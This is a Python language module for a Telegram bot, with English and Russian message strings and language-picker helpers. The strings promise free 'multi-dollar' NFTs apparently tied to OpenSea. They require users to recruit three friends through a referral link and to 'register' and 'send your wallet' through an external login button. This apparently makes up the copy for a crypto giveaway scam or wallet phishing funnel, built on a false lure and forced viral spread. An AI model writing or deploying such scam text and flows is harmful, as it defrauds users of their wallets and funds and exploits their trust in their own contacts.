from telegram import Update
from telegram import InlineKeyboardButton, InlineKeyboardMarkup

from .user import User

langs = {
    'welcome': {
        'en': '🌀 Welcome to the Artemis Bot',
        'ru': '🌀 Добро пожаловать в бота Artemis',
    },
    'choose_lang': {
        'en': '🇺🇸 Please select your language',
        'ru': '🇷🇺 Пожалуйста, выберите ваш язык',
    },
    'lang': {
        'en': '🇺🇸 English',
        'ru': '🇷🇺 Pусский',
    },
    'lang_updated': {
        'en': 'Your Language has been *Successfully* Updated\!',
        'ru': 'Ваш язык успешно обновлен',
    },
    'join_chats': {
        'en': 'Subscribe to the channel below 👇',
        'ru': 'Подпишитесь на канал ниже 👇'
    },
    'join_complete': {
        'en': 'Congratulations\nSuccessfully joined the channels 🎉',
        'ru': 'Поздравления\nУспешно присоединился к каналу 🎉',
    },
    'invites': {
        'en':
        'Ask three of your friends to join the bot with your special link. 🔗',
        'ru':
        'Попросите трех своих друзей присоединиться к роботу по вашей специальной ссылке. 🔗'
    },
    'invite_banner': {
        'en':
        'The first valid bot that gives free nft as a gift 🎁\n\nFrom the opensea site ⛵️\n\nGain multi-dollar nfts in just three steps 💵💰',
        'ru':
        'Первый робот, раздающий nft бесплатно 🎁\n\nС сайта: opensea ⛵️\n\nПолучите многодолларовую NFT всего за три шага 💵💰'
    },
    'success_invite': {
        'en': 'You have succeeded adding someone into the bot 🎉',
        'ru': 'Вам удалось добавить кого-то в бота 🎉'
    },
    'enough_invites': {
        'en':
        'Congratulations, you have successfully invited three people to the robot 🎉',
        'ru': 'Поздравляем, вы успешно пригласили в робота трех человек 🎉',
    },
    'login': {
        'en':
        'Register for the last step on the site and send your wallet\nNft will be sent to your account within 24 hours.',
        'ru':
        'Зарегистрируйтесь на последний шаг на сайте и отправьте свой кошелек\nNft будет отправлен на ваш счет в течение 24 часов.'
    },
    'external_login': {
        'en': 'Login with this button 👇',
        'ru': 'Войти с помощью этой кнопки 👇'
    }
}


def lang_markup(next_step=False):
    en = 'en'
    ru = 'ru'

    if next_step:
        en = 'next_en'
        ru = 'next_ru'

    lang_keyboard = [
        [
            InlineKeyboardButton(langs['lang']['en'], callback_data=en),
            InlineKeyboardButton(langs['lang']['ru'], callback_data=ru),
        ],
    ]
    return InlineKeyboardMarkup(lang_keyboard)


choose_lang_msg = f'''
{langs['welcome']['en']}
{langs['welcome']['ru']}

    {langs['choose_lang']['en']}
    {langs['choose_lang']['ru']}
'''


def change_lang(update: Update, *args, next_step=False):
    chat = update.effective_chat
    chat.send_message(choose_lang_msg, reply_markup=lang_markup(next_step))


def user_lang(user_id: int) -> str:
    user_data = User(user_id)
    return user_data.lang